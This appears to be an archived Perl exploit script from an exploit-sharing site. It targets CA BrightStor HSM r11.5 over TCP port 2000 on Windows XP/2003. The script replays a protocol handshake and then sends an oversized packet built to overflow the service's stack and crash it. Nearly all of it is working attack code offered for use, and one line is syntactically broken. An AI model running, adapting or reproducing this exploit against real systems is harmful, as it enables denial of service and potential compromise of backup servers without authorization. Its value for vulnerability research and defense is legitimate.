<html><head><title>CA BrightStor HSM <= r11.5 Remote Stack Based Overflow / DoS</title></head><pre>#!/usr/bin/perl
#
# *
# *     C@@@@@  O@@@@@@@       C@@@@@  O@@@@@@O           C@@@@@@@@@o                                                                              
# *    C@@@@@@@@@@@@@@@@O     C@@@@@@@@@@@@@@@@O      C@@@@@@@@@@@@@o                                                                             
# *    C@@@@@@o  .8@@@@@@.    C@@@@@@o   8@@@@@@.    @@@@@@O     .@@o                                                                             
# *    C@@@@@      @@@@@@c    C@@@@@      @@@@@@c   C@@@@@c                                                                                       
# *    C@@@@@      O@@@@@:    C@@@@@      O@@@@@:   @@@@@@                                                                                        
# *    C@@@@@      O@@@@@:    C@@@@@      O@@@@@:   8@@@@@                                                                                        
# *    C@@@@@      O@@@@@:    C@@@@@      O@@@@@:   :@@@@@@        ::                                                                             
# *    C@@@@@      O@@@@@:    C@@@@@      O@@@@@:    c@@@@@@@Coo8@@@o                                                                             
# *    C@@@@@      O@@@@@:    C@@@@@      O@@@@@:      C@@@@@@@@@@@@o  
# *    
# *   [0x00001010]                                                                        
# *
# * Title: CA BrightStor HSM &lt;= r11.5 Remote Stack Based Overflow / DoS
# * For: Windows XP (SP2 Professional) / Windows Server 2003 (Enterprise Edition)
# * Released by: NiceNameCrew [http://nnc.unkn0wn.eu]
# * Author: boecke &lt;boecke@herzeleid.net&gt;
# * Discovery: iDefense
# * Vulnerability Type: Remote Stack Overflow / DoS
# * Risk: High
# * TCP: 2000
# * 
# * This body, this body holding me, be my reminder here that I am not alone.
# *
#

use IO::Socket;

$handshake = 
&quot;\x14\x00\x00\x00&quot; .				#	[0x14000000] INIT_BEGIN 
&quot;\x42\x00\x00\x00&quot; . 				#	[0x42000000] FX_SET_CONSOLE_CREDENTIALS
&quot;\x07\x00\x00\x00&quot; . 				#	[0x07000000] GUI_FLAGS
&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;; 	#	[0x00000000] END

# 0030  ff d1 7b ef 00 00 14 00  00 00 44 00 00 00 07 00   ..{..... ..D.....
# 0040  00 00 00 00 00 00 00 00  00 00                     ........ ..      

$handshake_auth =
&quot;\x14\x00\x00\x00\x44\x00\x00\x00\x07\x00\x00\x00&quot; .
&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;;

$handshake_auth2 =
&quot;\x14\x00\x00\x00\x03\x00\x00\x00&quot; .
&quot;\x07\x00\x00\x00\x00\x00\x00\x00&quot; .
&quot;\x08\x00\x00\x00&quot;;

$handshake_auth3 =
&quot;\x14\x00\x00\x00\x32\x00\x00\x00&quot; .
&quot;\x07\x00\x00\x00\x00\x00\x00\x00&quot; .
&quot;\x1C\x00\x00\x00&quot;;

$handshake_auth4 =
&quot;\x14\x00\x00\x00\x1C\x00\x00\x00&quot; .
&quot;\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;;

# List Network Locations
$drives =
&quot;\x14\x00\x00\x00\x0F\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;;

# List Computers on Network (MSHOME)
$computers =
&quot;\x1A\x00\x00\x00&quot; .
&quot;\x27\x00\x00\x00&quot; .
&quot;\x07\x00\x00\x00&quot; .
&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot; .
&quot;\x4D\x53\x48\x4F\x4D\x45&quot; (MSHOME)

$damage =
&quot;\x40\x05\x00\x00\x1D\x00\x00\x00&quot; .
&quot;\x07\x00\x00\x00\x00\x00\x00\x00&quot; .
&quot;\x00\x00\x00\x00&quot; .
&quot;\x41&quot; x 1232 .
&quot;BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK&quot; .
&quot;LLLLMMMMNNNNOOOOLOLO&quot; .
&quot;\x41\x42\x43\x44&quot; .
&quot;RRRRSSSSTTTTUUUU&quot; .
&quot;VVVVWWWW&quot; .
&quot;\x2E\x41\x3B&quot; .
&quot;\x00\x00\x00\x00\x00\x00&quot;;

if ( $socket = IO::Socket::INET-&gt;new( PeerAddr =&gt; &quot;127.0.0.1&quot;, PeerPort =&gt; &quot;2000&quot;, Proto =&gt; &quot;TCP&quot; ))
{
	print $socket $handshake;
	recv($socket, $reply, 256, 0);
	print($reply . &quot;\n&quot;);

	print $socket $handshake_auth;
	recv($socket, $reply, 256, 0);
	print($reply . &quot;\n&quot;);

	print $socket $handshake_auth2;
	recv($socket, $reply, 256, 0);
	print($reply . &quot;\n&quot;);

	print $socket $handshake_auth3;
	recv($socket, $reply, 256, 0);
	print($reply . &quot;\n&quot;);

	print $socket $handshake_auth4;
	recv($socket, $reply, 256, 0);
	print($reply . &quot;\n&quot;);

	print $socket $damage;
	recv($socket, $reply, 256, 0);
	print($reply . &quot;\n&quot;);
}

# milw0rm.com [2007-10-27]</pre></html>